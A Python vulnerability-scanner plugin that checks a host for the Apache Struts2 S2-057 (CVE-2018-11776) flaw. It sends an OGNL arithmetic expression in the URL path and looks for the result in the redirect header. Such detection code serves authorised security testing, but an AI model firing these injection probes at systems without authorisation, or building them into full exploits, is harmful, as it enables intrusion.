# coding=utf-8
import requests
import sys
import random


def get_plugin_info():
    plugin_info = {
        "name": "Struts2 057远程代码执行",
        "info": "可直接执行任意代码，进而直接导致服务器被入侵控制。0928",
        "level": "紧急",
        "type": "代码执行",
        "author": "zhangdaoyuan@banggood.com",
        "url": "https://github.com/hook-s3c/CVE-2018-11776-Python-PoC/blob/master/",
        "keyword": "tag:tomcat;tag:jsp",
        "source": 1
    }
    return plugin_info

def check(ip, port, timeout=6):
    url = 'http://'+ip + ':' + str(port)
    try:
        r1 = random.randint(100,999)
        r2 = random.randint(100,999)
        r3 = r1 + r2

        urlOne = url
        urlTwo = urlOne + '/${%s+%s}/actionChain1.action' % (r1, r2)
        res = requests.get(url=urlTwo, timeout=timeout, allow_redirects=False, verify=False)
        if str(r3) in res.headers.get('Location'):
            return u'存在s2-057 CVE-2018-11776 漏洞!'
    except:
        pass

